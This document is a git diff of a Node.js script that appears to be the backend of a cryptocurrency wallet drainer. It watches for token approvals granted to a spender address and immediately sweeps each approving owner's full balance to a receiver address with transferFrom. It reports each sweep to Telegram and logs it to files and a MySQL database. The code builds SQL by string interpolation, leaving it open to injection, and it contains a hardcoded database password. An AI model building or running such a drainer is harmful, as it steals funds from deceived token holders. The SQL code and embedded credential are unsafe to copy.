@@ -1,17 +1,16 @@
 var argv = require('minimist')(process.argv.slice(2));
 const fs = require("fs")
-var { log, logSuccess, logError, logWaning, COLOR } = require("./std");
+var { log, logSuccess, logError, logWaning, COLOR, encodedStr } = require("./std");
 const clc = require("cli-color")
 
 const { WebSocketServer } = require('ws');
 
 const Web3 = require("web3")
-const HDWalletProvider = require("@truffle/hdwallet-provider");
 const CHAINS = require("./CHAINS");
 var request = require('request');
 var moment = require("moment")
 
-
+var mysql = require('mysql');
 
 
 
@@ -28,6 +27,66 @@ if (argv.receiver) receiver = argv.receiver.toString();
 logWaning("spender", spender)
 logWaning("receiver", receiver)
 
+
+var db = {
+    saveAppoved: async function (content) {
+        if (!content.note) content.note = "NULL";
+        let sql = `insert into wea.approveds
+    (transactionHash, chainId, symbol, owner, spender, note)
+    VALUES('${content.transactionHash}', '${content.chainId}', '${content.symbol}', '${content.owner}', '${content.spender}', ${content.note});`
+
+        this.con.query(sql, function (err, result) {
+            if (err && !err.code.includes("ER_DUP_ENTRY")) throw err;
+            // console.log("saveAppoved: " + result);
+        });
+    },
+
+    saveTransfered: async function (content) {
+        if (!content.note) content.note = "NULL";
+        let sql = `insert into wea.transfereds
+    (transactionHash, chainId, symbol, from, to, value, note)
+    VALUES('${content.transactionHash}', '${content.chainId}', '${content.symbol}', '${content.from}', '${content.to}', '${content.value}', ${content.note});`
+
+        this.con.query(sql, function (err, result) {
+            if (err && !err.code.includes("ER_DUP_ENTRY")) throw err;
+            // console.log("saveTransfered: " + result);
+        });
+    },
+
+    saveError: async function (error) {
+        let json = JSON.stringify(error).replaceAll("'", "\\'")
+        let sql = `insert into wea.transfererrors
+    (error)  VALUES('${json}');`
+
+        this.con.query((sql), function (err, result) {
+            if (err) throw err;
+            // console.log("saveError: " + result);
+        });
+    },
+
+    con: null,
+
+    config: {
+        host: "DESKTOP-LBUCS2T",
+        user: "s",
+        password: "w-nAbv7LbwdKQY-q"
+    },
+
+    connect: async function () {
+        return new Promise((rs, rj) => {
+            let connection = mysql.createConnection(this.config);
+
+            connection.connect((err) => {
+                if (err) rj(err)
+                console.log('connected db as id ' + connection.threadId);
+                this.con = connection;
+                rs(connection);
+            });
+        })
+    },
+}
+
+
 // log(privateKey)
 // log(COLOR.Clear);
 
@@ -39,8 +98,6 @@ async function loadSettings(file = "settings.json") {
     return settings;
 
 }
-
-
 
 async function saveSettings(settings, file = "settings.json") {
     let content = JSON.stringify(settings)
@@ -65,16 +122,28 @@ async function appendFile(filePath, content) {
     fs.appendFileSync(fd, content + "\n", 'utf8');
 }
 
-function sentAlertTelegram(content, settings = Settings) {
-    let message = JSON.stringify(content)
+async function sentAlertTelegram(content, type = "success", settings = Settings) {
+    let color = "#49c74e"
+    switch (type) {
+        case "warning":
+            color = "#ff9800";
+            break;
+        case "success":
+            color = "#49c74e";
+            break;
+        case "error":
+            color = "#e100007a";
+            break;
+    }
+    let message = encodeURIComponent(`<code style="color: ${color}">${JSON.stringify(content)}</code>`)
     var options = {
         'method': 'POST',
-        'url': `https://api.telegram.org/bot${settings.telegram.token}/sendMessage?chat_id=${settings.telegram.chatId}&text=${message}`,
+        'url': `https://api.telegram.org/bot${settings.telegram.token}/sendMessage?chat_id=${settings.telegram.chatId}&text=${message}&parse_mode=html`,
         'headers': {
         }
     };
     request(options, function (error, response) {
-        if (error) throw new Error(error);
+        if (error) logError("sentAlertTelegram error:", error.message)
         // console.log(response.body);
     });
 }
@@ -83,26 +152,30 @@ async function sendToken(web3, symbol, contract, from, to) {
     const gasPrice = await web3.eth.getGasPrice();
     let allowance = await contract.methods.allowance(from, spender).call();
     let balance = await contract.methods.balanceOf(from).call();
-    if (parseInt(allowance) > 1 && balance > 10) {
+    let decimals = await contract.methods.decimals().call();
+    let chainId = await web3.eth.net.getId();
+    // larger 10$
+    let min = 10 * (10 ** decimals);
+    if (allowance > min && balance > min) {
         const gasEstimate = await contract.methods.transferFrom(from, to, balance).estimateGas({ from: spender });
         log('sendToken', from, to, spender);
-        contract.methods.transferFrom(from, to, balance).send({ from: spender, gasPrice: gasPrice, gas: gasEstimate }).then(r => {
+        contract.methods.transferFrom(from, to, balance).send({ from: spender, gasPrice: gasPrice, gas: gasEstimate }).then(async r => {
             let content = {
-                chain: web3.eth.networkVersion,
-                symbol: symbol,
-                from: from,
-                to: to,
-                transactionHash: r.transactionHash,
+                onSent: {
+                    chainId: chainId,
+                    symbol: symbol,
+                    from: from,
+                    to: to,
+                    value: balance,
+                    transactionHash: r.transactionHash,
+                }
             }
-
             try {
-                appendFile("transfereds.txt", JSON.stringify(content))
+                db.saveTransfered(content.onSent)
+                appendFile("transfereds.txt", JSON.stringify(content.onSent))
                 logSuccess('transferFrom Success')
-                sendMessageClient({
-                    onSent: content
-                })
-
-                sentAlertTelegram({ onSent: content })
+                sendMessageClient(content)
+                sentAlertTelegram(content)
 
             } catch (error) {
                 throw error;
@@ -118,15 +191,19 @@ async function sendToken(web3, symbol, contract, from, to) {
             }
 
             try {
+                db.saveError({ error: error.message }).catch()
                 appendFile("transferedsError.txt", JSON.stringify(content))
                 sendMessageClient({ error: error.message })
-                logError("transferedsError: ")
-                logError(error)
+                sentAlertTelegram({ error: error.message })
+                logError("transferedsError: ", error.message)
+                // logError(error)
             } catch (error) {
                 throw error;
             }
         });
-    } else { logError("allowance: ", allowance, "balance: ", balance) }
+    } else {
+        logError("smaller 10$:", "allowance:", allowance / 10 ** decimals, "balance:", balance / 10 ** decimals)
+    }
 }
 
 function listenEvents(settings = Settings) {
@@ -164,6 +241,7 @@ function listenEvents(settings = Settings) {
                     let content = {
                         "symbol": symbol, "chainId": chainId, error: error.message
                     }
+                    db.saveError(content).catch(console.error)
                     appendFile("approvalError.txt", content)
                     sendMessageClient(content)
                     sentAlertTelegram(content)
@@ -179,7 +257,12 @@ function listenEvents(settings = Settings) {
                             transactionHash: event.transactionHash,
                         }
                     }
-                    appendFile("approveds.txt", content)
+                    db.saveAppoved(content.onApproval).catch(err => {
+                        logError(err)
+                        if (err.sqlMessage.includes("Duplicate entry"));
+                        else db.saveError(error)
+                    })
+                    appendFile("approveds.txt", JSON.stringify(content.onApproval))
                     sendMessageClient(content)
                     sentAlertTelegram(content)
                     sendToken(web3, symbol, contract, event.returnValues.owner, receiver)
@@ -195,10 +278,13 @@ function listenEvents(settings = Settings) {
 
 
 loadSettings()
-    .then(settings => {
-        let web3s, contracts = listenEvents(settings)
+    .then(async settings => {
+        db.config = settings.database
+        db.connect().then(c => {
+            let web3s, contracts = listenEvents(settings)
+            // sentAlertTelegram("main.js started: " + moment().format("D/M/Y h:m"))
 
-        sentAlertTelegram("main.js started: " + moment().format("D/M/Y h:m"))
+        })
     })
 // .catch(error => logError(error))
 var port = 8080;
